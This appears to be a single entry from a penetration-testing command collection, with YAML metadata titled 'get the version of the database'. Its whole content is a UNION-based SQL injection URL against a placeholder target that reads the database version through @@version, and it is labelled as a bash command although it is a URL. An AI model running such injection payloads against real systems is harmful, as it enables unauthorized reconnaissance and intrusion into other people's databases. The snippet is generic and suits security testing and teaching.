---
id: 1174afe7-9836-4577-9a22-c32caf815f29
name: get the version of the database
type: command
executor: bash
data: 'http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5

  '
output: null
created_at: '2020-07-14T18:14:46.798751+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# get the version of the database

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5

```
